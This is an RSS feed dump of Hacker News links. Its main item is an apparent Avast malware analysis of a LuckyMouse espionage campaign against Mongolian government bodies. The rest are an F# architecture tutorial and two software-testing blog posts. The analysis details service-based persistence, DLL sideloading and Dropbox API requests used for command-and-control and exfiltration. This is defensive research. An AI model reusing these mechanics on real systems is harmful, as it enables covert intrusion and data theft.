<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://stasaki.com/designer-as-writer/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504677</guid>
            <pubDate>Tue, 22 Dec 2020 10:02:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apt Group Targeting Governmental Agencies in East Asia]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504490">thread link</a>) | @realpanzer
<br/>
December 22, 2020 | https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/ | <a href="https://web.archive.org/web/*/https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2386">

                    
                    
                    
                    <div>
                        




<p>This summer, Avast discovered a new APT campaign targeting government agencies and a National Data Center of Mongolia. We consider with moderate confidence based on our research that the chinese-speaking APT group LuckyMouse is behind the attack.&nbsp;</p>



<p>The APT group planted backdoors and keyloggers to gain long-term access to government networks and then uploaded a variety of tools that they used to perform additional activities on the compromised network such as scanning of the local network and dumping credentials. We presume that the main aim of cyber-espionage was the exfiltration of sensitive data from potentially interesting government agencies.</p>



<p>According to our local telemetries, we consider that the government institutions were attacked in two ways. One was through a vulnerable company who is providing services for these agencies, and the other was through an email spear-phishing with a malicious attachment â€“ a weaponized document using CVE-2017-11882.&nbsp;</p>



<p>There are many tactics that are consistent with other reports of LuckyMouse; nevertheless, we are also seeing some previously undocumented tactics indicating that the actors have updated their toolset with Polpo and LuckyBack backdoors. Our analysis below will highlight those new tactics.&nbsp;</p>







<p>We base our presumption that this campaign was led by the LuckyMouse APT group on the tooling that we found during the investigation of this campaign, most of them having previously been attributed to LuckyMouse by other researchers[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>][<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>In 2018, Kaspersky Labs released two blog posts about LuckyMouse targeting a national data center containing Asian government resources. Their blog posts described several tool sets such as network filtering driver NDISProxy, weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors), and Earthworm tunneler. They also described a DLL sideloading technique abusing legitimate applications from Symantec (<span><em>IntgStat.exe</em></span>). This is a legitimate application that loads a DLL <span><em>pcalocalresloader.dll</em></span>. By sideloading their own version <span><em>pcalocalresloader.dll</em></span>, they load HyperBro RAT from a compressed and encrypted file<em> <span>thumbs.db</span></em>. While some of the tools that were used were publicly known tools that are available on the internet, the group also developed their own tools, including a rootkit[<a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://securelist.com/luckymouse-ndisproxy-driver/87914/" target="_blank" rel="noreferrer noopener">2</a>].</p>



<p>In April 2019, PaloAlto Networks released a blogpost about LuckyMouse. According to the post, the group installed webshells on a SharePoint server to compromise Government Organizations in the Middle East. Similarly, the group used several publicly known and available tools (such as mimikatz, curl, ntbscan). But what got our attention was the fact that the same HyperBro RAT was used in the campaign we were analyzing. The APT attack we analyzed also used a DLL sideloading technique, although with different executables. The executable used was a Symantec application <em><span>thinprobe.exe</span></em> that loads <em><span>thinhostprobedll.dll</span></em>. This DLL was then used to sideload <em><span>thumb.db</span></em> that contained encrypted and compressed HyperBro[<a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">3</a>].</p>



<p>Weâ€™ve also discovered a Polpo backdoor in the network belonging to the National Data Center of Mongolia. This backdoor was accompanied by samples that are known to be used by the LuckyMouse group which lead us to the conclusion that this backdoor is a new addition into LuckyMouseâ€™s toolkit. We also observed more common tools, e.g. VMProtect-obfuscated Earthworm tunneler, a custom installer dropping NDISProxy network filtering driver, and various network scanners.</p>







<p>We observed that this APT group was also targeting an unknown company that was providing services to government institutions in East Asia. The group infiltrated the companyâ€™s computers and managed to harvest credentials belonging to the companyâ€™s email accounts. Unfortunately, we havenâ€™t been able to identify which attack vector was used in this infiltration. These credentials were then used to send emails from the hacked companyâ€™s email accounts to the government officials. While we were unable to recover the whole email, weâ€™ve managed to recover the emailâ€™s header. The header indicates that these emails were asking the recipient to update a firmware, i.e. launch a self-extracting 7-zip archive attached to this email.</p>



<p>Date: Sun, 28 Jun 2020 20:43:08 +0800 (ULAT)&nbsp;<br>Subject: Re: Perform a firmware update on the server</p>



<p>XXXXXX_update.exe&nbsp;</p>



<p>(sha256:2D2EA3002C367684F21AD08BDC9B5079EBDEE08B6356AC5694EFA139D4C6E60D)</p>



<p>This archive drops three already familiar files â€“ Symantecâ€™s <em><span>thinprobe.exe</span></em>, malicious <em><span>thinhostprobedll.dll</span></em>, and <em><span>thumb.db</span></em>. The malicious DLL is used for DLL sideloading, decrypting and decompressing <em><span>thumb.db</span></em> and finally loading its processed content â€“ a HyperBro RAT . This backdoor has also been reported on by <a href="https://securelist.com/luckymouse-hits-national-data-center/86083/" target="_blank" rel="noreferrer noopener">Kaspersky[1]</a> and <a href="https://unit42.paloaltonetworks.com/emissary-panda-attacks-middle-east-government-sharepoint-servers/" target="_blank" rel="noreferrer noopener">PaloAlto Networks[3]</a>, the latter providing an extensive description of the HyperBro RAT.</p>



<div><figure><img src="https://lh3.googleusercontent.com/HI4k00UGHM0aHxi1kmzTStkWcM_Yz5mVSnueCoYZRmCFVx7spfjtuWgjdCWgca5-kbEVBWF7PmFvwuB-LXiOiP2Lc7ycLQvxldd3bAjdbL2iqaoaNirYkA32iWkpbyGMUSeONrKA" alt=""><figcaption>Figure 1: Overview of infection vector</figcaption></figure></div>











<p>In this following section we describe a tool set we found on the victimâ€™s PC, used by the APT group for cyber-espionage and lateral movement through the network. We could divide these tools into three categories:</p>



<ul><li>Helpers: ServiceInstaller, ShellCodeExecutor, DataExtractor 1/2, Information Collector</li><li>Remote access: StartServiceTool, Korplug, LuckyBack, BlueTraveller, Polpo</li><li>Publicly available tools: UAC bypass tool, port scanners, password dumpers, FRP, Earthworm tunneler</li></ul>



<p>In detail, we found the following tools:</p>



<h2>StartServiceTool</h2>



<p>This tool installs <em><span>wcm.dll</span></em> into <em><span>%WINDIR%\system32</span></em>, a registry record</p>



<p><span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsConnections Manager</span></p>



<p>is created with the following values:</p>



<p>Description: Makes automatic connect/disconnect decisions based on the network connectivity options currently available to the PC and enables management of network connectivity based on Group Policy settings.</p>



<p>DisplayName: Windows Connections Manager</p>



<p>ServiceDll: <span>C:\Windows\system32\wcm.dll</span>.</p>



<p>This effectively creates a new service. The dropped binary is a 32-bit service DLL that has two parts â€“ embedded DLL, and mmLoader (<a href="http://tishion.github.io/mmLoader/" target="_blank" rel="noreferrer noopener">http://tishion.github.io/mmLoader/</a>), a loader that bypasses the windows loader.</p>



<p>The final payload DLL is written in GO and contains a single export named â€œ<span>Interface</span>â€œ. This function expects 4 arguments consisting of two strings and their corresponding lengths. The string values specify the victim ID and the Dropbox API key to use. The API key is passed in as an RC4 encrypted + base64 encoded value.<br>The hardcoded decryption key is â€œ<span>0000111122223333</span>â€œ. The DLL additionally contains a default API key which appears to be for the authors test account.</p>



<p>Initially, it tries do download a file from Dropbox via the HTTP API:</p>



<p>POST /2/files/download HTTP/1.1<br>Host: content.dropboxapi.com<br>User-Agent: Go-http-client/1.1<br>Content-Length: 0<br>Authorization: Bearer [snipped]<br>Dropbox-Api-Arg: {â€œpathâ€: â€œ/infos/000000.txtâ€}<br>Accept-Encoding: gzip</p>



<p>If the server responds with a file, it tries to upload a file with a timestamp and a hostname onto Dropbox:</p>



<p>POST /2/files/upload HTTP/1.1<br>Host: content.dropboxapi.com<br><span>User-Agent: Go-http-client/1.1<br></span>Content-Length: 36<br>Authorization: Bearer [snipped]<br>Content-Type: application/octet-stream<br>Dropbox-Api-Arg: {â€œpathâ€: â€œ/infos/116a0d.txtâ€,â€modeâ€: â€œoverwriteâ€,â€autorenameâ€: true,â€muteâ€: false,â€strict_conflictâ€: false}<br>Accept-Encoding: gzip</p>



<p><span>%currentDate% %currentTime%##%hostname%</span></p>



<p>Afterwards, a C&amp;C request-response loop is started. Based on the response from the C&amp;C server, one of the following commands is executed: download files, upload files, sleep, quit, or execute commands on a command line. See the following diagram for a detailed flow, keep in mind that all download/upload are using the aforementioned Dropbox API:</p>



<div><figure><img src="https://lh6.googleusercontent.com/TWjSJB0IAQsj6KfXfB2FZKxILGcmI7Kpj85DqivileheKEVnpPEVb_L1R6rRnXnAF3RYHwMOBSdi95l0tty4dRncJ-mbTxQgfihvLdhc_7rdJILmNp4-dkWc4tWfnmnWlsRFh2vu" alt=""><figcaption>Figure 2: Overview of detailed execution flow</figcaption></figure></div>



<h2>ServiceInstaller</h2>



<p>We assume that this installer is intended to be executed by one of the aforementioned backdoors as it requires command-line parameters for its successful execution:</p>


<figure>
<table>
<tbody>
<tr>
<td>Switch</td>
<td>Argument</td>
</tr>
<tr>
<td>-i&nbsp;</td>
<td>path of DLL to install as a service</td>
</tr>
<tr>
<td>-u</td>
<td>Uninstall a specific service name</td>
</tr>
</tbody>
</table>
</figure>


<p>At first, security descriptors of both <em><span>%windir%\system32\</span> </em>and <span><em>%windir%\system32\drivers\ </em></span>changes to allow the current user to copy files to these locations. Then the installer copies a service executable to <span><em>%windir%\system32\</em> </span>under a randomly generated name (4 alphanumeric characters).</p>



<p>Depending on whether a service named <span><em>DFS Replication</em> </span>already exists in&nbsp;</p>



<p><span>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost netsvcs</span>,</p>



<p>a new service called <span><em>DFS Replication </em></span>(if it does not exist) or <span><em>IAS Jet Database Access Service %number%</em></span> is created. More specifically, its parameters are:</p>



<p>Description: <em>â€œConfigures Internet Authentication Service (IAS). If this service is stopped, the remote network access that requires user authentication will be unavailable. If this service is disabled, any services that explicitly depend on it will fail to start or (Retail) Replicates files among multiple PCs keeping them in sync. On Client, it is used to roam folders between PCs; on the server, it is used to provide high availability and local access across a wide area network (WAN). If the service is stopped, file replication does not occur, and the files on the server become out-of-date. If the service is disabled, any services that explicitly depend on it will not start.â€<br></em><span>DisplayName: <span>DFS Replication/IAS Jet Database Access Service %number%</span><br></span><span>ServiceDll: <span>C:\Windows\system32\&lt;4 random alphanumeric characters&gt;.dll</span>.<br></span><span>Tag: 0<br></span><span>Security: 0</span></p>



<h2>ShellCodeExecutor</h2>



<p>This utility takes hex-encoded shellcode as an argument and then proceeds to execute it. The code responsible for decoding and unpacking can be seen below:</p>



<div><figure><img loading="lazy" src="https://lh4.googleusercontent.com/z8TcUKts9HbflaUytjH9SwOBtQsbKXwk6wpUAyufIG3lVmXKqmGjEhpZD_mN5IK_3q1BgzKSBHoZXbt5KXLW_vnjMykhHWntFoCKFOXEOTrghI3s_2b9TCINQqvILHrOZZbGJVA-" alt="" width="766" height="660"><figcaption>Figure 3: Decoding algorithm and executing decoded payload in allocated memory</figcaption></figure></div>



<p>While we werenâ€™t able to reconstruct which â€¦</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/">https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/</a></em></p>]]>
            </description>
            <link>https://decoded.avast.io/luigicamastra/apt-group-targeting-governmental-agencies-in-east-asia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504490</guid>
            <pubDate>Tue, 22 Dec 2020 09:26:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Functional Architecture Demo]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25504355">thread link</a>) | @simendsjo
<br/>
December 22, 2020 | https://functional.christmas/2020/22 | <a href="https://web.archive.org/web/*/https://functional.christmas/2020/22">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><section>
<p>In this post, I'm going to show the design of a functional program which
solved a difficult problem while being easy to get right and performant.
By avoiding mutation, we were also able to implement "time-travel" to
look how an action would affect the future, easy rollbacks and stale
data detection.</p>
<p>In OOP, there are often deep call-stacks, which I consider a smell
itself, and mutation of state and side-effects often happen at a deep
level. When constructing an application which should be mostly pure with
immutable data, we have to push the side-effects up the call-stack to
the outer boundary. This means that we need to return to the caller
rather than keep diving deeper in the call-stack.</p>
<p>To recap some terminology:</p>
<p>pure<br>
Given the same arguments, it returns the same result. And it has no
effect (other than generating heat) on the outside world. This means no
visible mutation, and no visible side-effects.</p>
<p>immutable<br>
Once a value is set, it cannot be changed. "Mutation" is done by
constructing a new copy rather than modifying in place.</p>
<p>side-effect<br>
A modification to state outside the local environment.</p>
<p>There are some key parts in the architecture I'm demoing here:</p>
<p>State<br>
A record containing all state in the application</p>
<p>Operation<br>
A small language of verbs which describes changes to <code>State</code></p>
<p>ApplicationEvent<br>
Some external event which should trigger changes to our state</p>
<p>Handler<br>
A function which maps from an <code>ApplicationEvent</code> to an <code>Operation</code></p>
<p>You don't need an event driven application to take advantage of the
architecture in this post. Using just immutable state with pure
functions to change the state, will still yield most of the benefits.
Having events and a custom language might be a nice addition, or it
might be over-engineering.</p>
<p>Given the above parts, the flow of the application is then:</p>
<ul>
<li>Something triggers an <code>ApplicationEvent</code></li>
<li><code>Handlers</code> translates to <code>Operations</code></li>
<li>We run each <code>Operation</code> on the <code>State</code>, producing an updated <code>State</code></li>
<li>We use the new state for fun and profit</li>
</ul>
<p>When the new state is produced, we can act on the result by interpreting
the changes. We might validate the changes. We might save to the
database. We might detect stale data by rerunning the application. We
might use it for transactions. Our production implementation does all
this, not just without any side-effects or mutation, but <strong>because</strong>
there are no side-effects or mutations. We can safely rerun things,
throw away things, copy, interpret results, and there are never a chance
of introducing an error outside of our changes â€“ Changes in one place
can never affect something else.</p>

<p>We'll go through the key parts of our <a href="https://github.com/simendsjo/functional-christmas-2020_functional-architecture-demo/blob/main/Small.fs">Small</a> demo.
More/different comments are in the actual source file, so I encourage
you to look there as well.</p>
<p>The demo will model changes to an Order Line in an online shopping
chart. It's probably completely overkill for such use, but it's
difficult to create good examples â€“ see an actual use-case in the Large
demo.</p>
<p>We can Add an OrderLine, we can Increment and Decrement the count, and
we can Remove an OrderLine. To make things a bit more interesting, I
also added a Reset and Add with another initial count than 1.</p>
<p>We'll use an integer as a unique id for the OrderLine, and a integer for
the actual count and initial value.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>Key</span> <span>=</span> int
<span>type</span> <span>Value</span> <span>=</span> int</code></pre></div>
<h2>Defining a custom language for our domain</h2>
<p>We encode the possible operations on an OrderLine using a Discriminated
Union (also called a Sum Type). These operations are the verbs in our
domain, and our Embedded Domain Specific Language (EDSL) for
manipulating OrderLine items.</p>
<p>Only Set is needed to support our described operations, but we create
some more constructs in our language. Putting more in the language will
make mapping events to operations simpler as the language is more
expressive, at the cost of a more complex language. It's difficult to
decide what goes in the language, and what should only be helper
functions. If you need to distinguish between different operations (e.g.
increment vs set) when interpreting the operations, having them as
separate operations might be a good idea.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>Operation</span> <span>=</span>
    <span>|</span> Set <span>of</span> <span>(</span>Key <span>*</span> Value<span>)</span>
    <span>|</span> Reset <span>of</span> <span>Key</span>
    <span>|</span> Remove <span>of</span> <span>Key</span>
    <span>|</span> Incr <span>of</span> <span>Key</span>
    <span>|</span> Decr <span>of</span> <span>Key</span></code></pre></div>
<h2>Application state as an immutable record</h2>
<p>The State is where we hold information about all OrderItems. The state
includes things necessary to execute our lanugage. In addition, we keep
things which is convenient for other usecases, but could in theory just
as well be held in other structures. The <code>Audit</code> field is a list of all
operations which has been executed, which makes it easy to do things
like maintaining an audit log, persisting changes, detecting stale data,
rollback transactions, and so on.</p>
<p>Our last field, <code>LastPersisted</code>, is state for the interpreter which
persists changes to disk. Depending on the interpreter and application,
this state might be better to keep separate.</p>
<p>Having a single structure makes it easy to have a clean architecture
without much boilerplate (just <code>State -&gt; State</code> functions), but it can
be difficult to find out what information is used where, and who changes
what. As with any decision, it's a tradeoff, but having a simple
architecture might be more beneficial than a clean separation of state â€“
remember, there is no mutation or side-effects in the functions which
operates on the state!</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>State</span> <span>=</span> <span>{</span>
    Data <span>:</span> <span>Map</span><span>&lt;</span>Key<span>,</span> <span>(</span>Value <span>*</span> Value<span>)</span><span>&gt;</span> 
    Audit <span>:</span> <span>Operation</span> list
    LastPersisted <span>:</span> <span>Operation</span>
<span>}</span> <span>with</span>
    <span>static</span> <span>member</span> Empty <span>=</span> <span>{</span>
        Data <span>=</span> Map<span>.</span>empty
        Audit <span>=</span> <span>[</span><span>]</span>
        
        LastPersisted <span>=</span> Remove <span>-</span><span>1</span>
    <span>}</span></code></pre></div>
<h2>Helpers for "manipulating" state, i.e. State -&gt; State functions</h2>
<p>As you start creating mappings from <code>ApplicationEvent</code> to <code>Operation</code>,
you'll quickly see patterns repeating for state querying and
manipulation. I like to extract these to helper functions as I go. For
our demo, I've created three helper functions.</p>
<p>Notice that the design here is to "never fail", and rather just return
sensible defaults instead. This of course depends on the application,
but this demo is modelled after our production application, which should
never fail to process an event.</p>
<div data-language="fsharp"><pre><code><span><span>[&lt;</span><span>Literal</span><span>&gt;]</span></span>
<span>let</span> defaultInitial <span>=</span> <span>1</span>


<span>let</span> getValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> <span>(</span>Value <span>*</span> Value<span>)</span> <span>=</span>
    state<span>.</span>Data
    <span>|&gt;</span> Map<span>.</span>tryFind key
    <span>|&gt;</span> Option<span>.</span>defaultValue <span>(</span>defaultInitial<span>,</span> defaultInitial<span>)</span>


<span>let</span> setInitialAndValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>initial <span>:</span> <span>Value</span><span>)</span> <span>(</span>value <span>:</span> <span>Value</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>{</span> state <span>with</span> Data <span>=</span> Map<span>.</span>add key <span>(</span>initial<span>,</span> value<span>)</span> state<span>.</span>Data <span>}</span>


<span>let</span> setValue <span>(</span>key <span>:</span> <span>Key</span><span>)</span> <span>(</span>value <span>:</span> <span>Value</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>let</span> initial<span>,</span> _ <span>=</span> getValue key state
    setInitialAndValue key initial value state</code></pre></div>
<h2>Interpreting our language and executing on State</h2>
<p>With the helper functions, we're now able to process our language. We'll
look at each operation, and manipulate the state accordingly. As a final
step, we log the operation we've executed. Even though we "execute" the
language, we're not mutating any existing state or doing any
side-effects. We're creating a new state as we go. It's thus important
that we use immutable/persistent datastructures that's fast for such
use, and that we're using them correctly e.g. by prepending to the list
rather than appending.</p>
<p>You might notice a <code>print</code> inside here, and scream SIDE-EFFECT! And yes,
it's true, but it's for demo purposes, and you shouldn't do this :)</p>
<div data-language="fsharp"><pre><code><span>let</span> execute <span>(</span>op <span>:</span> <span>Operation</span><span>)</span> <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    <span>match</span> op <span>with</span>
    <span>|</span> Set <span>(</span>key<span>,</span> value<span>)</span> <span>-&gt;</span>
        setValue key value state
    <span>|</span> Reset key <span>-&gt;</span>
        <span>let</span> initial<span>,</span> value <span>=</span> getValue key state
        setInitialAndValue key initial value state
    <span>|</span> Remove key <span>-&gt;</span>
        <span>{</span> state <span>with</span> Data <span>=</span> Map<span>.</span>remove key state<span>.</span>Data <span>}</span>
    <span>|</span> Incr key <span>-&gt;</span>
        <span>let</span> _<span>,</span> value <span>=</span> getValue key state
        setValue key <span>(</span>value <span>+</span> <span>1</span><span>)</span> state
    <span>|</span> Decr key <span>-&gt;</span>
        <span>let</span> _<span>,</span> value <span>=</span> getValue key state
        setValue key <span>(</span>value <span>-</span> <span>1</span><span>)</span> state
    <span>|&gt;</span> <span>fun</span> state <span>-&gt;</span>
        printfn <span>"Executed %A"</span> <span>op</span>
        <span>{</span> state <span>with</span> Audit <span>=</span> op <span>::</span> state<span>.</span>Audit <span>}</span></code></pre></div>
<h2>Interpreting our language and auditlog to persist to database</h2>
<p>Now that we have a way of changing the state, we can write an
interpreter that runs side-effects. This simulates writing to a
database. Remember that this interpreter has its state in <code>State</code>, so it
has to return a copy of it. In Haskell, this would be a
<code>State -&gt; IO State</code> function as it has side-effects, but in F#, we just
do side-effects without help from the type-system. The interpreters can
be made more efficient by avoiding unnecessary work. [Add 1, Remove 1]
can be reduced to a noop.</p>
<div data-language="fsharp"><pre><code><span>let</span> persist <span>(</span>state <span>:</span> <span>State</span><span>)</span> <span>:</span> State <span>=</span>
    state<span>.</span>Audit
    <span>|&gt;</span> Seq<span>.</span>takeWhile <span>(</span><span>fun</span> op <span>-&gt;</span> <span>not</span> <span>(</span>obj<span>.</span><span>ReferenceEquals</span><span>(</span>op<span>,</span> state<span>.</span>LastPersisted<span>)</span><span>)</span><span>)</span>
    <span>|&gt;</span> Seq<span>.</span>rev
    <span>|&gt;</span> Seq<span>.</span>fold <span>(</span><span>fun</span> state op <span>-&gt;</span>
        printfn <span>"Saving %A"</span> <span>op</span>
        <span>{</span> state <span>with</span> LastPersisted <span>=</span> op <span>}</span>
    <span>)</span> state</code></pre></div>
<h2>Mapping application events to our custom language</h2>
<p>We still haven't hooked our implementation up to the outer application,
but let's do this now. The key part is our <code>Handler</code> function which does
the mapping. It can access the state in case it needs to look at
anything, and it returns an <code>Operation option</code> in case the
<code>ApplicationEvent</code> should trigger a change in the state. An alternative
implementation could return <code>Operation list</code> instead to support 0+
rather than just 0-1. For events which should trigger more than one
change, we can just write multiple handlers, which is what we did in our
production application. In retrospect, a list would have been more
expressive, and might have made some mappings more readable.</p>
<div data-language="fsharp"><pre><code><span>type</span> <span>ApplicationEvent</span><span>(</span>key<span>)</span> <span>=</span>
    <span>member</span> <span>val</span> Key <span>=</span> key <span>with</span> get<span>,</span> set

<span>type</span> <span>Handler</span> <span>=</span> State <span>-&gt;</span> ApplicationEvent <span>-&gt;</span> Operation option</code></pre></div>
<p>Given an event has happened in the application, we need a way to run
this through all possible handlers, accumulating the changes. This
implementation runs in sequence, where each handler will see the changes
done by the previous. Depending on the use-case, you might want to run
them in parallel, merging the result, or similar.</p>
<div data-language="fsharp"><pre><code><span>let</span> handle <span>(</span>handlers <span>:</span> <span>Handler</span> list<span>)</span> <span>(</span>ev â€¦</code></pre></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://functional.christmas/2020/22">https://functional.christmas/2020/22</a></em></p>]]>
            </description>
            <link>https://functional.christmas/2020/22</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504355</guid>
            <pubDate>Tue, 22 Dec 2020 08:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to make your UI automation tests resilient to changes?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25504262">thread link</a>) | @Kodziak
<br/>
December 22, 2020 | https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes | <a href="https://web.archive.org/web/*/https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Using CSS selectors to get elements in end-to-end tests is the most common way (besides xpath), but it can also be tricky and hard to maintain. One day everything could work fine and another a CSS class could be renamed. Styles could change without touching the business flow and then we could have a problem - we'll need to maintain the tests. Of course, the developers could do those changes for us, but they don't know our scenarios, our tests etc. It would be time-consuming for them, because they don't always know if their changes could affect our tests. And for these problems, I think I might have a solution.</p>
<p>But first let's talk about CSS a bit.</p>
<h2 id="what-are-the-common-problems-with-css-selectors">What are the common problems with CSS selectors?</h2>
<p>Imagine that one day, you had to write a very ugly selector. The element you wanted to use was nested and the only solution available was to base it on CSS classes and HTML structure. And then, a developer made a little refactor that removed some useless HTML tags, which were of course, used in your selector. But he didn't change the business flow. And guess what will happen? Yes, you're right! The test will fail. Your selector will be broken and will need maintenance.</p>
<p>But let's take a step back and think about what are CSS classes designed for? For sure, not to use them in end-to-end tests. Why? Because they're designed to style elements. Everyday there might be changes in the application that don't affect the business flow - which is the most important part in end-to-end tests - but are related with class names changes. That hurts when we need to maintain a test that didn't involve any user flow changes.</p>
<p>Two examples, one simple solution - find better a mechanism to get elements.</p>
<p>What do I recommend? Read below!</p>
<h2 id="use-data-test-id-for-help">Use <code>data-test-id</code> for help!</h2>
<p>For sure, they're controversial but there are two main advantages of using them.</p>
<p>First one is that they're bulletproof. What? I mean, when we use this attribute with an element, no matter if the developer changes the HTML structure or CSS classes, we still get what we want. Unless they remove the element or change the business flow, our test should work fine.</p>
<p>And second, as you may notice, the developer will see that attribute while working with the code. It could help because they can notify us about possible changes or just maintain the tests if needed - using <code>data-test-id</code> makes it easier find occurrences in tests. And if we have more people working on end-to-end tests we can build more reliable solutions. That's what we all want to achieve - always working product:)</p>
<p>More about working closely with developers below:)</p>
<h2 id="but-should-i-use-them-everywhere">But should I use them everywhere?</h2>
<p>Nope. Only with the elements used in tests. We don't want a mess in the code where almost every element has this attribute and only a few of them is used in tests. We want to build trust towards the tests and somehow show the devs that their changes could break our work.</p>
<p>Of course, we'll add some code, but with <code>babel</code> or similar solution we'll get rid of <code>data-test-id</code> on production version. Also, you can take a look at <code>facebook</code> where these attributes are used;).</p>
<p>A little bit of extra work can bring us many benefits.</p>
<h2 id="what-are-the-benefits-of-using-them">What are the benefits of using them?</h2>
<p>For sure, we can build communication between us and developers. How? Talk. If they see this kind of attribute with an element they want to refactor, they have to maintain the test (in the best case) or just notify us that something could affect it. It's beneficial to know when something can break our tests before running them on testing environment. It'll build trust to the tests. They won't fail because of changes which don't affect the business flow. It will help all of us.</p>
<p>The only thing we need to do is give the developers an opportunity and reason to maintain the tests.</p>
<h2 id="conclusion">Conclusion</h2>
<p>Code structure can always change and it shouldn't affect our tests unless the business flow changes. With selectors based on CSS it could. That's why we decided to go with <code>data-test-id</code> which seems like a reliable solution.</p>
<p>They have some shortcomings but overall I think there is more pros. If you use them you'll work closely with devs which could result in other interesting solutions:) Just remember to add them wisely - only in the elements you're using in tests:)</p>
<p>Have a nice day! ğŸ¥³</p></div></div>]]>
            </description>
            <link>https://kodziak.com/blog/how-to-make-your-ui-automation-tests-resilient-to-changes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25504262</guid>
            <pubDate>Tue, 22 Dec 2020 08:41:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Testing your code is not optional]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25504016">thread link</a>) | @alfotis
<br/>
December 21, 2020 | https://www.falexandrou.com/2020/12/20/testing-your-code/ | <a href="https://web.archive.org/web/*/https://www.falexandrou.com/2020/12/20/testing-your-code/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<h3 id="lets-start-with-a-story">Letâ€™s start with a storyâ€¦</h3>
<p>A quadrillion years ago, I used to work for companies none of which had automated tests in place and believe it or not,
testing was not that popular; We wrote the code, tested manually on our local machines, deployed our newly committed
piece of art and called it a day. If however, something went wrong, we tried to replicate the issue on a test environment,
fixed it, deployed the fix and so on, usually hoping that the fix wouldnâ€™t introduce a <a href="https://en.wikipedia.org/wiki/Software_regression">regression</a>.</p>
<p>Then, writing unit tests somehow gained traction and became popular among developers who liked following best practices but still,
there was a lot of ground to be covered in fast-moving startups and agencies, where delivering projects is a time-sensitive thing.
I even remember debating the lead developer of a VC-backed startup, who at some point insisted that testing is a waste of time and thatâ€™s why they didnâ€™t do it.</p>
<h4 id="so-is-testing-our-code-a-waste-of-time">So, is testing our code a waste of time?</h4>
<p><strong>No, itâ€™s not!</strong> Believe it or not though, this was (hopefully isnâ€™t anymore) a somehow acceptable opinion a few years back.
While testing may require some development time, it actually helps save enormous amounts of time if done properly.</p>
<p>Letâ€™s think of the following scenario:</p>
<ul>
<li>A developer works on Feature X for a few days, completes their work and pushes code to the testing environment.</li>
<li>Then, a QA or the developer themselves tests manually, finds a couple of issues which are then fixed and the project hits production.</li>
<li>The code then interacts with user-input or other existing data in a database and errors occur.</li>
<li>The Product Owner raises a ticket, assigns the QA, the QA reproduces the issue, adds technical information to the ticket, sends it to the developer,
they apply a fix and the ticket goes back n forth between the stakeholders until the code hits production.</li>
</ul>
<p>In the meantime, there might be regression issues and the back n forth continues until at some point the ticket closes, while several others have been raised.</p>
<p>Chaos? Yes. Reminds you of something? It certainly does for me. This was the daily, fire-fighting routine for the lead developer that was mentioned earlier.</p>
<p>Having an efficient and detailed testing suite in place, saves you some of this trouble; The code and tests are written, the QA does what theyâ€™re supposed to do,
(make sure the finished product meets certain quality standards), instead of getting blocked becaused they stumbled upon a tiny mistake that could have been caught beforehand.
Ideal? Maybe. Letâ€™s now break down the several ways we can save time.</p>
<h4 id="testing-is-a-safety-net-but-also-a-documentation-and-developer-onboarding-tool">Testing is a safety net, but also a documentation and developer onboarding tool</h4>
<p>Usually, the scope of a function is (or should be) limited and, depending on the input, there are certain outcomes.
